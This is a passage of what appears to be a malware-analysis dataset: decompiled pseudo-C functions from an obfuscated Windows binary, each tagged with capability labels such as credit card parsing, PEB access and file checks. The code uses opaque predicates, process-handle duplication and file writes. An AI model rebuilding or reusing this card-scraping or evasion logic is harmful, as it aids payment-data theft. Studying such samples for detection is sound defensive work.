bVar14 = CARRY4(uVar3, uVar3);\n        bVar16 = uVar3 == 0;\n        pcStack24 = 0x13;\n        ppuStack28 = 0x407014;\n        ppuStack32 = 0x4034b6;\n        pcVar4 = fcn.004042d0();\n        if ((bVar16) || (!bVar16)) goto code_r0x004034ca;\n        cVar19 = SCARRY4(pcVar7, 1);\n        pcVar7 = pcVar7 + 1;\n        cVar18 = pcVar7 < 0;\n        if (!bVar14 && pcVar7 != NULL) goto code_r0x004034c5;\ncode_r0x0040350f:\n        if (cVar19 != cVar18) {\n            unaff_ESI = unaff_ESI + -1;\n            puVar11 = unaff_EDI | unaff_EBP;\n            unaff_EDI = puVar11 + 1;\n            *puVar11 = pcVar4;\n        }\n    }\n    else {\n        pcVar7 = unaff_EBX + 1;\n        uVar8 = pcVar4;\n        if (!uVar15 && pcVar7 != NULL) {\n            in_AF = 9 < (uVar8 & 0xf) | in_AF;\n            piVar1 = (pcVar4 & 0xffff0000 | CONCAT11((pcVar4 >> 8) + in_AF, uVar8 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar1 = *piVar1 - pcVar7;\n            unaff_ESI = unaff_ESI + 1;\n            goto code_r0x00403470;\n        }\n        *unaff_EDI = *unaff_EDI + extraout_CL;\n        *pcVar4 = *pcVar4 + uVar8;\n        *unaff_EDI = *unaff_EDI + extraout_CL;\n        *pcVar4 = *pcVar4 + uVar8;\n        unaff_EBX[0x77] = unaff_EBX[0x77] + uVar8;\ncode_r0x004034c5:\n        in_AF = 9 < (pcVar4 & 0xf) | in_AF;\n        piVar1 = (pcVar4 & 0xffff0000 | CONCAT11((pcVar4 >> 8) + in_AF, pcVar4 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - pcVar7;\n        unaff_ESI = unaff_ESI + 1;\ncode_r0x004034ca:\n        ppuStack32 = 0x18;\n        pcStack36 = 0x4070a4;\n        ppuStack40 = 0x13;\n        ppuStack44 = 0x407014;\n        uStack48 = 0x4034dd;\n        fcn.004042d0();\n        cVar19 = SBORROW1(extraout_CL_00, '\\x01');\n        cVar18 = extraout_CL_00 + -1 < '\\0';\n        pcStack24 = 0x13;\n        ppuStack28 = 0x407014;\n        ppuStack32 = 0x40350d;\n        pcVar4 = fcn.004042d0();\n        if (cVar19 == cVar18) goto code_r0x0040350f;\n    }\n    ppuStack28 = 0x13;\n    ppuStack32 = 0x407014;\n    pcStack36 = 0x40353b;\n    fcn.004042d0();\n    ppuStack32 = unaff_EDI;\n    ppuStack28 = unaff_ESI;\n    fcn.004042d0();\n    ppuStack32 = unaff_EDI;\n    ppuStack28 = unaff_ESI;\n    fcn.004042d0();\n    iVar9 = unaff_ESI + 1;\n    uVar15 = 0;\n    cVar19 = SBORROW2(iVar9, iVar9);\n    cVar18 = '\\0';\n    uVar17 = 1;\n    ppuStack32 = unaff_EDI;\n    ppuStack28 = unaff_ESI;\n    pcStack24 = unaff_EBP;\n    uVar20 = fcn.004042d0();\n    puVar5 = uVar20;\n    ppuVar12 = unaff_EDI;\n    if ((cVar19 == cVar18) && (cVar19 != cVar18)) {\n        out(0xc4, puVar5);\n        ppuStack28 = uVar20 >> 0x20 & 0xffffff00 | uVar20 >> 0x20 ^ extraout_CL_01;\n        pcStack24 = pcStack24 & 0xffff0000 | ppuStack28;\n        ppuVar12 = unaff_EDI + 1;\n        *unaff_EDI = puVar5;\n        uVar8 = pcVar7 >> 8;\n        uVar15 = uVar8 < *puVar5;\n        uVar17 = uVar8 == *puVar5;\n    }\n    ppuStack32 = 0x5;\n    pcStack36 = 0x407114;\n    ppuStack40 = 0x13;\n    ppuStack44 = 0x407014;\n    uStack48 = 0x4035dd;\n    fcn.004042d0();\n    if ((uVar15 || uVar17) || (!uVar15 && !uVar17)) {\n        uStack48 = 0xd;\n        uStack52 = 0x40711c;\n        uStack56 = 0x13;\n    }\n    cVar18 = *pcVar7;\n    *(ppuVar12 + 0x6a) = *(ppuVar12 + 0x6a) - &stack0xffffffc8;\n    pcVar4 = extraout_EDX + 0x13;\n    bVar14 = SCARRY1(*pcVar4, extraout_CH - cVar18);\n    *pcVar4 = *pcVar4 + (extraout_CH - cVar18);\n    uVar20 = fcn.004042d0(0x407014);\n    iVar6 = uVar20 >> 0x20;\n    if ((bVar14) || (!bVar14)) {\ncode_r0x00403614:\n        *(iVar6 + 0x13) = *(iVar6 + 0x13) + extraout_CH_00;\n        fcn.004042d0(0x407014);\n        ppuVar10 = unaff_ESI;\n        if ((*0x10 != 0xc) && (*0x10 == 0xc)) {\n            ppuVar13 = ppuVar12 + 1;\n            puVar5 = in(extraout_EDX_00);\n            *ppuVar12 = puVar5;\n            goto code_r0x004036ac;\n        }\n        *(extraout_EDX_00 + 0xf) = *(extraout_EDX_00 + 0xf) ^ extraout_CH_01;\n        pcStack24 = 0x13;\n        ppuStack28 = 0x407014;\n        ppuStack32 = 0x403655;\n        fcn.004042d0();\n        ppuVar13 = ppuVar12;\n    }\n    else {\n        ppuVar13 = ppuVar12 + 1;\n        ppuVar10 = unaff_ESI + 1;\n        *ppuVar12 = *unaff_ESI;\n        iVar6 = 0x2c68196a;\n        unaff_ESI = ppuVar10;\n        ppuVar12 = ppuVar13;\n        if (SCARRY4(uVar20, 1)) goto code_r0x00403614;\n        pcVar7[0x516610c4] = pcVar7[0x516610c4] + uVar20 + '\\x01';\n    }\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x40368b;\n    fcn.004042d0();\ncode_r0x004036ac:\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x4036c2;\n    fcn.004042d0();\n    ppuStack32 = 0xb;\n    pcStack36 = 0x407174;\n    ppuStack40 = 0x13;\n    ppuStack44 = 0x407014;\n    uStack48 = 0x4036e5;\n    fcn.004042d0();\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x40371b;\n    fcn.004042d0();\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x403745;\n    fcn.004042d0();\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x403784;\n    fcn.004042d0();\n    ppuStack32 = 0xe;\n    pcStack36 = 0x4071a4;\n    ppuStack40 = 0x13;\n    ppuStack44 = 0x407014;\n    uStack48 = 0x4037a9;\n    fcn.004042d0();\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x4037cc;\n    fcn.004042d0();\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x403800;\n    fcn.004042d0();\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x40382d;\n    fcn.004042d0();\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x403860;\n    fcn.004042d0();\n    bVar14 = extraout_DH_00 < 0x36;\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x403885;\n    ppuStack44 = ppuVar13;\n    ppuStack40 = ppuVar10;\n    pcStack36 = unaff_EBP;\n    fcn.004042d0();\n    if ((bVar14) || (!bVar14)) {\n        ppuStack32 = 0x4;\n        pcStack36 = 0x407230;\n        ppuStack40 = 0x13;\n    }\n    uVar3 = *(ppuVar13 + 0xe58be73);\n    *(extraout_EDX_01 + 0x40) = *(extraout_EDX_01 + 0x40) ^ extraout_EDX_01 >> 8;\n    *(extraout_EDX_01 + 0x13) = *(extraout_EDX_01 + 0x13) + extraout_CH_02;\n    ppuStack44 = 0x407014;\n    uStack48 = 0x4038a9;\n    fcn.004042d0();\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x4038c4;\n    fcn.004042d0();\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x4038eb;\n    ppuStack44 = ppuVar13 ^ uVar3;\n    ppuStack40 = ppuVar10;\n    fcn.004042d0();\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x40390a;\n    fcn.004042d0();\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x40392c;\n    fcn.004042d0();\n    return;\n}\n",
        "token_count": 3989
    },
    "00403cc0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403d59) overlaps instruction at (ram,0x00403d56)\n// \n\nuint8_t * __cdecl fcn.00403cc0(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    char *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    ushort *puVar7;\n    char extraout_CH;\n    char cVar9;\n    char extraout_CH_00;\n    uint32_t uVar8;\n    char *unaff_EBX;\n    ushort *unaff_ESI;\n    uint *puVar10;\n    uint *puVar11;\n    int32_t unaff_EDI;\n    uint *puVar12;\n    uint *puVar13;\n    bool bVar14;\n    bool bVar15;\n    char cVar16;\n    ulong uVar17;\n    uint8_t *puVar18;\n    ushort uStack28;\n    ushort uStack26;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack20;\n    ushort uStack18;\n    ushort uStack16;\n    ushort uStack14;\n    \n    uStack16 = 0x20;\n    uStack14 = 0;\n    uStack20 = 0x73a4;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uStack28 = 0x7014;\n    uStack26 = 0x40;\n    fcn.004042d0();\n    uStack16 = 0x26;\n    uStack14 = 0;\n    uStack20 = 0x73c4;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uStack28 = 0x7014;\n    uStack26 = 0x40;\n    fcn.004042d0();\n    bVar14 = false;\n    uStack16 = 8;\n    uStack14 = 0;\n    uStack20 = 0x73ec;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uStack28 = 0x7014;\n    uStack26 = 0x40;\n    fcn.004042d0();\n    if ((!bVar14) && (bVar14)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.004042d0(0x407014, 0x13, 0x4073f4, 0x19);\n    uStack16 = 0xb;\n    uStack14 = 0;\n    uStack20 = 0x7410;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uStack28 = 0x7014;\n    uStack26 = 0x40;\n    fcn.004042d0();\n    uStack16 = 0x12;\n    uStack14 = 0;\n    uStack20 = 0x741c;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uStack28 = 0x7014;\n    uStack26 = 0x40;\n    fcn.004042d0();\n    bVar14 = false;\n    bVar15 = true;\n    uStack16 = 0x12;\n    uStack14 = 0;\n    uStack20 = 0x7430;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uStack28 = 0x7014;\n    uStack26 = 0x40;\n    uVar17 = fcn.004042d0();\n    cVar9 = extraout_CH;\n    if ((!bVar14 && !bVar15) && (bVar14 || bVar15)) {\n        cVar9 = *unaff_EBX;\n        *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &uStack28;\n        cVar9 = (extraout_CH - cVar9) + *(uVar17 + 0x44);\n        if (cVar9 == '\\0') {\n            unaff_EBX[-0x7faeef3c] = unaff_EBX[-0x7faeef3c] + uVar17;\n        }\n    }\n    pcVar1 = (uVar17 >> 0x20) + 0x13;\n    *pcVar1 = *pcVar1 + cVar9;\n    fcn.004042d0(0x407014);\n    uStack16 = 8;\n    uStack14 = 0;\n    uStack20 = 0x7448;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uStack28 = 0x7014;\n    uStack26 = 0x40;\n    fcn.004042d0();\n    uStack16 = 8;\n    uStack14 = 0;\n    uStack20 = 0x7450;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uStack28 = 0x7014;\n    uStack26 = 0x40;\n    fcn.004042d0();\n    uStack16 = 6;\n    uStack14 = 0;\n    uStack20 = 0x7458;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uStack28 = 0x7014;\n    uStack26 = 0x40;\n    fcn.004042d0();\n    uStack16 = 7;\n    uStack14 = 0;\n    uStack20 = 0x7460;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uStack28 = 0x7014;\n    uStack26 = 0x40;\n    puVar18 = unaff_ESI;\n    fcn.004042d0();\n    uStack16 = 7;\n    uStack14 = 0;\n    uStack20 = 0x7468;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uStack28 = 0x7014;\n    uStack26 = 0x40;\n    fcn.004042d0();\n    uStack16 = 6;\n    uStack14 = 0;\n    uStack20 = 0x7470;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uStack28 = 0x7014;\n    uStack26 = 0x40;\n    iVar4 = fcn.004042d0();\n    cVar16 = SCARRY4(iVar4, 1);\n    cVar9 = iVar4 + 1 < 0;\n    uStack16 = 0x25;\n    uStack14 = 0;\n    uStack20 = 0x7478;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uStack28 = 0x7014;\n    uStack26 = 0x40;\n    uVar17 = fcn.004042d0();\n    puVar6 = uVar17 >> 0x20;\n    puVar5 = uVar17;\n    if ((cVar16 == cVar9) && (cVar16 != cVar9)) {\n        bVar14 = puVar6 == 0xa068086a;\n        puVar6 = puVar5;\n        if (bVar14) {\n            iVar4 = 0x23000048;\n            puVar13 = CONCAT22(uStack24, uStack26);\n            uVar8 = CONCAT22(uStack20, uStack22);\n            puVar11 = *0x23000058;\n            if (unaff_ESI <= puVar5) {\n                do {\n                    puVar7 = &uStack18;\n                    if (puVar5 < unaff_ESI) {\n                        if (puVar5 < unaff_ESI) goto code_r0x00403fbd;\n                        puVar12 = puVar13 + 1;\n                        puVar10 = puVar11 + 1;\n                        *puVar13 = *puVar11;\n                        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n                        iVar4 = -0x751e7e30;\n                        puVar5[0x75cb3a1e] = puVar5[0x75cb3a1e] | uVar8;\n                        uVar8 = uVar8 + *(unaff_EBX + 0x7e8d144d);\n                        piVar2 = uVar8 - 0x73;\n                        iVar3 = *piVar2;\n                        *piVar2 = *piVar2 + uVar8;\n                        unaff_ESI = &uStack18;\n                        if (!SCARRY4(iVar3, uVar8)) goto code_r0x00403fcf;\n                        puVar13 = puVar13 + 5;\n                        bVar14 = *puVar10 == *puVar12;\ncode_r0x00403fd3:\n                        if (bVar14) {\n                            return puVar7;\n                        }\n                        puVar11 = *(iVar4 + 0x10);\n                        unaff_ESI = puVar7;\n                    }\n                    else {\ncode_r0x00403fbd:\n                        uVar8 = uVar8 & 0xffffff00 | *unaff_ESI;\n                        unaff_EBX = unaff_EBX & 0xffffff00 | *puVar11;\n                        if (*unaff_ESI == *puVar11) {\n                            puVar12 = puVar11 + 1;\n                            uVar8 = *(iVar4 + 0x14) - 1;\n                            puVar10 = unaff_ESI + 1;\ncode_r0x00403fcf:\n                            unaff_EBX = NULL;\n                            bVar14 = true;\n                            do {\n                                puVar7 = unaff_ESI;\n                                puVar13 = puVar12;\n                                if (uVar8 == 0) break;\n                                uVar8 = uVar8 - 1;\n                                puVar13 = puVar12 + 1;\n                                bVar14 = *puVar10 == *puVar12;\n                                puVar10 = puVar10 + 1;\n                                puVar12 = puVar13;\n                            } while (bVar14);\n                            goto code_r0x00403fd3;\n                        }\n                    }\n                    unaff_ESI = unaff_ESI + 1;\n                } while (unaff_ESI <= puVar5);\n            }\n            return NULL;\n        }\n    }\n    else {\n        puVar18 = 0x13;\n    }\n    puVar6[0x13] = puVar6[0x13] + extraout_CH_00;\n    puVar6 = fcn.004042d0(0x407014, puVar18);\n    return puVar6;\n}\n",
        "token_count": 2578
    },
    "00401ef0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401ff0) overlaps instruction at (ram,0x00401fef)\n// \n// WARNING: Removing unreachable block (ram,0x00401ff0)\n\nuint __cdecl fcn.00401ef0(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    char extraout_CH;\n    uint16_t uVar4;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    ushort in_DS;\n    bool bVar5;\n    unkbyte6 Var6;\n    ushort uStack76;\n    uchar uStack74;\n    uchar uStack73;\n    uint32_t uStack72;\n    uint32_t arg_8h_00;\n    uint var_4h;\n    \n    bVar5 = false;\n    *0x42374c = fcn.00404810();\n    if ((bVar5) || (uVar2 = *0x42374c,  !bVar5)) {\n        uVar2 = arg_8h;\n    }\n    pcVar1 = uVar2 + 1;\n    *unaff_EDI = *unaff_ESI;\n    *(uVar2 - 0x7f) = *(uVar2 - 0x7f) + extraout_CH;\n    *pcVar1 = *pcVar1 + pcVar1;\n    *0x6a08458d = *0x6a08458d + extraout_CH;\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (uVar2 != 0xffffffff) {\n        uStack72 = 0x401f74;\n        arg_8h_00 = uVar2;\n        iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n        if (iVar3 != 0) {\n            if (((0 < iVar3) && (iVar3 < 1)) || (*0x42374c != 0)) {\n                uStack72 = 0x401f9c;\n                iVar3 = fcn.00401e20(arg_8h_00);\n                *0x42374c = iVar3 == 0;\n            }\n            uStack76 = 0;\n            uStack74 = 0;\n            uStack73 = 0;\n            uStack72 = uVar2;\n            Var6 = fcn.00404d60();\n            uVar4 = Var6 >> 0x20;\n            if ((SCARRY4(&stack0xffffffb4, 8) == &stack0xffffffbc < 0) &&\n               (uStack72 = uStack72 & 0xffff | uVar4 << 0x10,  SCARRY4(&stack0xffffffb4, 8) != &stack0xffffffbc < 0)) {\n                out(0xc4, Var6);\n                uStack72 = CONCAT22(uVar4, in_DS);\n                unaff_EDI[1] = Var6;\n            }\n            if (*0x42374c == 0) {\n                uStack76 = uVar2 >> 8;\n                uStack74 = uVar2 >> 0x18;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n            }\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 744
    },
    "00401e20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401ed8) overlaps instruction at (ram,0x00401ed6)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401e20(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    int32_t unaff_EDI;\n    uint uStackY60;\n    uint uStackY56;\n    uint var_4h;\n    \n    iVar1 = fcn.004043c0(0x407094);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar1 != 0) {\n        if ((iVar1 < 0) || (uStackY56 = extraout_ECX,  iVar1 >= 0)) {\n            uStackY56 = arg_8h;\n        }\n        uStackY60 = 0x401eb6;\n        uStackY60 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar1 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)();\n        if (iVar1 != 0) {\n            *(unaff_EDI + 0x56) = *(unaff_EDI + 0x56) - &stack0xffffffc4;\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 330
    },
    "00402130": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nunkbyte6 __cdecl fcn.00402130(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 74
    },
    "00402200": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00402200(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t *unaff_EDI;\n    uint *puVar5;\n    bool bVar6;\n    bool bVar7;\n    uint var_80h;\n    uint32_t uStack112;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    uint uStack8;\n    \n    puVar5 = &stack0xfffffffc;\n    uVar2 = fcn.004044b0();\n    bVar7 = false;\n    bVar6 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 == 0) {\n        return 0;\n    }\n    if ((bVar6) && (!bVar6)) {\n        puVar4 = &stack0xffffff70;\n        cVar1 = '\\x1e';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar4 = puVar4 + -1;\n            *puVar4 = *puVar5;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    func_0x00401bf0();\n    if ((!bVar7) && (bVar7)) {\n        *unaff_EDI = uStack112;\n        return uStack112;\n    }\n    iVar3 = fcn.004043c0(0x40708c);\n    if (iVar3 != -1) {\n        return 0;\n    }\n    fcn.00403940();\n    *0x423750 = 1;\n    iVar3 = fcn.00402fd0();\n    if (iVar3 != 0) {\n        return 0;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar5 = &var_1fh;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar5 = &var_80h + 1;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar5 = &var_60h + 1;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &var_40h + 1;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    iVar3 = fcn.00404b80(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    iVar3 = fcn.00403020(&var_20h);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    iVar3 = fcn.004027a0(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar3 != 0;\n}\n",
        "token_count": 958
    },
    "00402fd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402fd0(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00404250(0x407028);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*((&stack0xfffffffc & 0xffff0000 | *0x10 - 4) - 4));\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 102
    },
    "004043c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404445) overlaps instruction at (ram,0x00404444)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004043c0(uint8_t *arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    int32_t var_8h;\n    uint hObject;\n    \n    hObject = 0xffffffff;\n    iVar5 = (**0x423738)();\n    if (iVar5 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar7 = &var_12ch;\n    var_8h = iVar5;\n    for (iVar6 = 0x49; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    iVar6 = (**0x42373c)(iVar5);\n    pcVar3 = _sym.imp.MSVCRT.dll__stricmp;\n    uVar2 = hObject;\n    while( true ) {\n        hObject = uVar2;\n        if (iVar6 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar5);\n            return uVar2;\n        }\n        uVar4 = iVar6;\n        cVar1 = uVar4 - *arg_8h;\n        iVar5 = iVar5 + -1;\n        func_0x1018a3b7((in_NT & 1) * 0x4000 | SBORROW1(uVar4, *arg_8h) * 0x800 | (in_IF & 1) * 0x200 |\n                        (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                        ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar4 < *arg_8h | (in_ID & 1) * 0x200000 |\n                        (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n        (**(arg_8h + 0x52))();\n        iVar6 = (*pcVar3)();\n        if (iVar6 == 0) break;\n        iVar6 = (**0x423740)(iVar5, &var_130h);\n        arg_8h = arg_8h + 1;\n        uVar2 = hObject;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n    return var_128h;\n}\n",
        "token_count": 752
    },
    "00404900": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00404900(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402580(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    fcn.00402580(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    fcn.00402580(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    fcn.00402580(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    iVar1 = fcn.004048b0();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar1 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar1;\n    }\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    var_4h = 0x104;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00402c40(0x80000001, 0x407270, 0x40729c, 0xf4, *0x10 + -0x110, 0xf8);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(*0x10 + -0x110, 0xec);\n        if (iVar1 == 0) {\n            *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n        }\n    }\n    return;\n}\n",
        "token_count": 547
    },
    "00402ab0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402b09) overlaps instruction at (ram,0x00402b07)\n// \n// WARNING: Removing unreachable block (ram,0x00402b25)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00402ab0(uint *arg_8h, uint16_t *arg_ch, uint *arg_10h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    char cVar3;\n    uint *puVar4;\n    int32_t unaff_EDI;\n    uint8_t uVar5;\n    bool bVar6;\n    uint8_t in_AF;\n    \n    puVar4 = arg_10h;\n    if (arg_10h != NULL) {\n        do {\n            bVar6 = (POPCOUNT(puVar4 & 0xff) & 1U) == 0;\n            if ((bVar6) || (!bVar6)) {\n                uVar5 = 0;\n                arg_10h = *arg_ch;\n            }\n            else {\n                puVar2 = puVar4 + 1;\n                out(*puVar4, arg_ch);\n                uVar5 = in_AF;\n                do {\n                    cVar3 = arg_10h >> 8;\n                    uVar5 = 9 < (arg_10h & 0xf) | uVar5;\n                    arg_10h = CONCAT31(CONCAT21(arg_10h >> 0x10, cVar3 - uVar5), -uVar5);\n                    puVar4 = puVar2;\n                    in_AF = uVar5;\n                } while (uVar5 || cVar3 == *arg_ch);\n            }\n            piVar1 = unaff_EDI + 